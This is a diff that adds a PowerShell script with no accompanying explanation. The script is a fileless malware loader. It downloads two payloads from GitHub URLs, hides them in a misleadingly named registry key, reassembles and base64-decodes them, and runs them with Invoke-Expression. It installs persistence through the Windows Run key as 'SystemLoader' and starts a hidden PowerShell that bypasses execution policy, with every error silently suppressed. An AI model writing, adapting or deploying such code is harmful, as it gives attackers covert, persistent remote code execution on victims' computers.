@@ -1,0 +1,85 @@
+try {
+    $bScriptUrl = "https://raw.githubusercontent.com/jimmmichang/rupigc2/refs/heads/main/byp_bs.txt"
+    $pDataUrl = "https://raw.githubusercontent.com/jimmmichang/rupigc2/refs/heads/main/bnobyps.txt"
+
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Encoding = [System.Text.Encoding]::UTF8
+    
+    $bScript = $webClient.DownloadString($bScriptUrl)
+    $pData = $webClient.DownloadString($pDataUrl)
+    
+    $regPath = "HKCU:\Software\SystemConfig"
+    
+    if (Test-Path $regPath) {
+        Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    
+    New-Item -Path $regPath -Force | Out-Null
+    New-ItemProperty -Path $regPath -Name "ScriptB" -Value $bScript -PropertyType String -Force | Out-Null
+    
+    $maxSize = 65000
+    $dataLength = $pData.Length
+    
+    if ($dataLength -gt $maxSize) {
+        $partCount = [math]::Ceiling($dataLength / $maxSize)
+        
+        for ($i = 0; $i -lt $partCount; $i++) {
+            $start = $i * $maxSize
+            $length = [Math]::Min($maxSize, $dataLength - $start)
+            $part = $pData.Substring($start, $length)
+            $partName = "P$i"
+            
+            New-ItemProperty -Path $regPath -Name $partName -Value $part -PropertyType String -Force | Out-Null
+        }
+        
+        New-ItemProperty -Path $regPath -Name "PartsCount" -Value $partCount -PropertyType String -Force | Out-Null
+    } else {
+        New-ItemProperty -Path $regPath -Name "PData" -Value $pData -PropertyType String -Force | Out-Null
+    }
+    
+    $executeCode = @'
+try {
+    $regPath = "HKCU:\Software\SystemConfig"
+    $regData = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
+    
+    if ($regData) {
+        $scriptB = $regData.ScriptB
+        if ($scriptB) {
+            Invoke-Expression $scriptB
+        }
+        
+        if ($regData.PData) {
+            $base64Data = $regData.PData
+        } elseif ($regData.PartsCount) {
+            $partsCount = [int]$regData.PartsCount
+            $base64Data = ""
+            
+            for ($i = 0; $i -lt $partsCount; $i++) {
+                $partName = "P$i"
+                $part = $regData.$partName
+                if ($part) {
+                    $base64Data += $part
+                }
+            }
+        }
+        
+        if ($base64Data) {
+            $decodedBytes = [System.Convert]::FromBase64String($base64Data)
+            $decodedScript = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
+            Invoke-Expression $decodedScript
+        }
+    }
+} catch {
+}
+'@
+    
+    New-ItemProperty -Path $regPath -Name "RunCode" -Value $executeCode -PropertyType String -Force | Out-Null
+    
+    $runPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $runValue = 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& { $r=''HKCU:\Software\SystemConfig''; $c=(Get-ItemProperty -Path $r -Name ''RunCode'' -ea 0).RunCode; if($c){iex $c} }"'
+    
+    New-ItemProperty -Path $runPath -Name "SystemLoader" -Value $runValue -Force | Out-Null
+    
+    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { `$r='HKCU:\Software\SystemConfig'; `$c=(Get-ItemProperty -Path `$r -Name 'RunCode' -ea 0).RunCode; if(`$c){iex `$c} }`""
+} catch {
+}
